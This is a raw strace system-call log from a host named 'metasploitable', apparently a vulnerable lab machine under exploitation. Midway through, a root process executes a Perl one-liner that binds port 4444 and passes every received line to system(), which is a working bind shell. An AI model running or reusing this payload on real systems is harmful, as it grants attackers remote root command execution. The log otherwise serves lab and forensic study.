10560 07:33:34.939587 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
10560 07:33:34.939605 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7da3000
10560 07:33:34.939616 mmap2(0xb7dab000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7dab000
10560 07:33:34.939633 close(1)          = 0
10560 07:33:34.939645 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10560 07:33:34.939659 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
10560 07:33:34.939673 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
10560 07:33:34.939763 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
10560 07:33:34.939780 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d98000
10560 07:33:34.939792 mmap2(0xb7da1000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7da1000
10560 07:33:34.939808 close(1)          = 0
10560 07:33:34.939832 munmap(0xb7f53000, 29913) = 0
10560 07:33:34.939887 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
10560 07:33:34.939905 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
10560 07:33:34.939919 _llseek(1, 0, [0], SEEK_CUR) = 0
10560 07:33:34.939946 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
10560 07:33:34.939962 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f5a000
10560 07:33:34.939974 _llseek(1, 1624, [1624], SEEK_SET) = 0
10560 07:33:34.939990 munmap(0xb7f5a000, 1624) = 0
10560 07:33:34.940000 close(1)          = 0
10560 07:33:34.940031 getpgrp()         = 3831
10560 07:33:34.940042 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
10560 07:33:34.940058 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
10560 07:33:34.940074 brk(0x8101000)    = 0x8101000
10560 07:33:34.940106 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10560 07:33:34.940122 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10560 07:33:34.940140 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10560 07:33:34.940178 brk(0x8102000)    = 0x8102000
10560 07:33:34.940205 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10560 07:33:34.940224 stat64("/sbin/AB", 0xbfba11f8) = -1 ENOENT (No such file or directory)
10560 07:33:34.940236 stat64("/bin/AB", 0xbfba11f8) = -1 ENOENT (No such file or directory)
10560 07:33:34.940248 stat64("/usr/sbin/AB", 0xbfba11f8) = -1 ENOENT (No such file or directory)
10560 07:33:34.940259 stat64("/usr/bin/AB", 0xbfba11f8) = -1 ENOENT (No such file or directory)
10560 07:33:34.940273 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
10560 07:33:34.940288 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dce6f8) = 10561
10561 07:33:34.940337 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10561 07:33:34.940343 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
10561 07:33:34.940357 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
10561 07:33:34.940369 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
10561 07:33:34.940385 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10561 07:33:34.940401 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
10561 07:33:34.940414 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
10561 07:33:34.940473 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
10561 07:33:34.940487 --- SIGPIPE (Broken pipe) @ 0 (0) ---
10561 07:33:34.940561 exit_group(127)   = ?
10560 07:33:34.955807 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
4519  07:33:34.955842 waitpid(10560,  <unfinished ...>
10560 07:33:34.955855 <... rt_sigprocmask resumed> NULL, 8) = 0
10560 07:33:34.975787 --- SIGCHLD (Child exited) @ 0 (0) ---
10560 07:33:34.975837 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 10561
10560 07:33:34.975859 waitpid(-1, 0xbfba0e78, WNOHANG) = -1 ECHILD (No child processes)
10560 07:33:34.975869 sigreturn()       = ? (mask now [])
10560 07:33:34.975893 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10560 07:33:34.975908 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10560 07:33:34.975919 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10560 07:33:34.975932 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
10560 07:33:34.975950 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10560 07:33:34.975961 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
10560 07:33:34.975995 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10560 07:33:34.976016 stat64("/sbin/perl", 0xbfba1228) = -1 ENOENT (No such file or directory)
10560 07:33:34.976029 stat64("/bin/perl", 0xbfba1228) = -1 ENOENT (No such file or directory)
10560 07:33:34.976041 stat64("/usr/sbin/perl", 0xbfba1228) = -1 ENOENT (No such file or directory)
10560 07:33:34.976053 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
10560 07:33:34.976070 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
10560 07:33:34.976095 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
10560 07:33:34.976110 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dce6f8) = 10562
10562 07:33:34.976173 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10562 07:33:34.976191 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
10562 07:33:34.976204 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
10562 07:33:34.976216 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
10562 07:33:34.976230 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10562 07:33:34.976366 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
10562 07:33:34.976393 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
10562 07:33:34.976444 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
10562 07:33:34.976534 brk(0)            = 0x8153000
10562 07:33:34.976559 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10562 07:33:34.976575 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eec000
10562 07:33:34.976590 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
10562 07:33:34.976608 open("/etc/ld.so.cache", O_RDONLY) = 1
10562 07:33:34.976621 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10562 07:33:34.976637 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7ee4000
10562 07:33:34.976648 close(1)          = 0
10562 07:33:34.976658 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10562 07:33:34.976673 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
10562 07:33:34.976688 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
10562 07:33:34.976777 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
10562 07:33:34.976794 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ee0000
10562 07:33:34.976815 mmap2(0xb7ee2000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7ee2000
10562 07:33:34.976868 close(1)          = 0
10562 07:33:34.976893 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10562 07:33:34.976925 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
10562 07:33:34.976940 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
10562 07:33:34.977025 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
10562 07:33:34.977042 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ebb000
10562 07:33:34.977053 mmap2(0xb7ede000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7ede000
10562 07:33:34.977069 close(1)          = 0
10562 07:33:34.977080 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10562 07:33:34.977094 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
10562 07:33:34.977111 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
10562 07:33:34.977196 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
10562 07:33:34.977211 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eba000
10562 07:33:34.977224 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ea2000
10562 07:33:34.977236 mmap2(0xb7eb6000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7eb6000
10562 07:33:34.977250 mmap2(0xb7eb8000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7eb8000
10562 07:33:34.977264 close(1)          = 0
10562 07:33:34.977275 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10562 07:33:34.977289 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
10562 07:33:34.977302 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
10562 07:33:34.977465 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
10562 07:33:34.977483 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d53000
10562 07:33:34.977495 mmap2(0xb7e9c000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7e9c000
10562 07:33:34.977509 mmap2(0xb7e9f000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e9f000
10562 07:33:34.977523 close(1)          = 0
10562 07:33:34.977535 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10562 07:33:34.977548 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
10562 07:33:34.977562 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
10562 07:33:34.977652 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
10562 07:33:34.977669 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d21000
10562 07:33:34.977680 mmap2(0xb7d2a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d2a000
10562 07:33:34.977694 mmap2(0xb7d2c000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d2c000
10562 07:33:34.977707 close(1)          = 0
10562 07:33:34.977730 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d20000
10562 07:33:34.977743 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d208c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
10562 07:33:34.977868 mprotect(0xb7e9c000, 4096, PROT_READ) = 0
10562 07:33:34.977942 munmap(0xb7ee4000, 29913) = 0
10562 07:33:34.977955 set_tid_address(0xb7d20908) = 10562
10562 07:33:34.977964 set_robust_list(0xb7d20910, 0xc) = 0
10562 07:33:34.977974 futex(0xbfbc6860, 0x81 /* FUTEX_??? */, 1) = 0
10562 07:33:34.977988 rt_sigaction(SIGRTMIN, {0xb7ea62c0, [], SA_SIGINFO}, NULL, 8) = 0
10562 07:33:34.978001 rt_sigaction(SIGRT_1, {0xb7ea6340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
10562 07:33:34.978013 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
10562 07:33:34.978027 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
10562 07:33:34.978045 uname({sys="Linux", node="metasploitable", ...}) = 0
10562 07:33:34.978091 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
10562 07:33:34.978136 brk(0)            = 0x8153000
10562 07:33:34.978145 brk(0x8174000)    = 0x8174000
10562 07:33:34.978189 getuid32()        = 0
10562 07:33:34.978199 geteuid32()       = 0
10562 07:33:34.978208 getgid32()        = 0
10562 07:33:34.978216 getegid32()       = 0
10562 07:33:34.978253 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7cff000
10562 07:33:34.978278 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
10562 07:33:34.978295 read(1, "{\31\363\314", 4) = 4
10562 07:33:34.978338 close(1)          = 0
10562 07:33:34.978371 time(NULL)        = 1495625614
10562 07:33:34.978454 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfbc6530) = -1 ENOENT (No such file or directory)
10562 07:33:34.978541 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfbc6530) = -1 ENOENT (No such file or directory)
10562 07:33:34.978567 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfbc6530) = -1 ENOENT (No such file or directory)
10562 07:33:34.978583 stat64("/usr/local/lib/perl/5.8.7", 0xbfbc6670) = -1 ENOENT (No such file or directory)
10562 07:33:34.978595 stat64("/usr/local/share/perl/5.8.7", 0xbfbc6670) = -1 ENOENT (No such file or directory)
10562 07:33:34.978608 stat64("/usr/local/lib/perl/5.8.6", 0xbfbc6670) = -1 ENOENT (No such file or directory)
10562 07:33:34.978620 stat64("/usr/local/share/perl/5.8.6", 0xbfbc6670) = -1 ENOENT (No such file or directory)
10562 07:33:34.978631 stat64("/usr/local/lib/perl/5.8.4", 0xbfbc6670) = -1 ENOENT (No such file or directory)
10562 07:33:34.978642 stat64("/usr/local/share/perl/5.8.4", 0xbfbc6670) = -1 ENOENT (No such file or directory)
10562 07:33:34.978658 stat64("/usr/local/lib/perl/5.8.3", 0xbfbc6670) = -1 ENOENT (No such file or directory)
10562 07:33:34.978669 stat64("/usr/local/share/perl/5.8.3", 0xbfbc6670) = -1 ENOENT (No such file or directory)
10562 07:33:34.978681 stat64("/usr/local/lib/perl/5.8.2", 0xbfbc6670) = -1 ENOENT (No such file or directory)
10562 07:33:34.978692 stat64("/usr/local/share/perl/5.8.2", 0xbfbc6670) = -1 ENOENT (No such file or directory)
10562 07:33:34.978704 stat64("/usr/local/lib/perl/5.8.1", 0xbfbc6670) = -1 ENOENT (No such file or directory)
10562 07:33:34.978715 stat64("/usr/local/share/perl/5.8.1", 0xbfbc6670) = -1 ENOENT (No such file or directory)
10562 07:33:34.978727 stat64("/usr/local/lib/perl/5.8.0", 0xbfbc6670) = -1 ENOENT (No such file or directory)
10562 07:33:34.978738 stat64("/usr/local/share/perl/5.8.0", 0xbfbc6670) = -1 ENOENT (No such file or directory)
10562 07:33:34.978761 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc6368) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:34.978775 _llseek(0, 0, [0], SEEK_CUR) = 0
10562 07:33:34.978786 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc6368) = -1 EBADF (Bad file descriptor)
10562 07:33:34.978805 _llseek(1, 0, 0xbfbc63b0, SEEK_CUR) = -1 EBADF (Bad file descriptor)
10562 07:33:34.978851 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc6368) = -1 EINVAL (Invalid argument)
10562 07:33:34.978863 _llseek(2, 0, 0xbfbc63b0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10562 07:33:34.978874 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
10562 07:33:34.978904 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc6428) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:34.978914 _llseek(1, 0, [0], SEEK_CUR) = 0
10562 07:33:34.978925 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
10562 07:33:34.978937 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
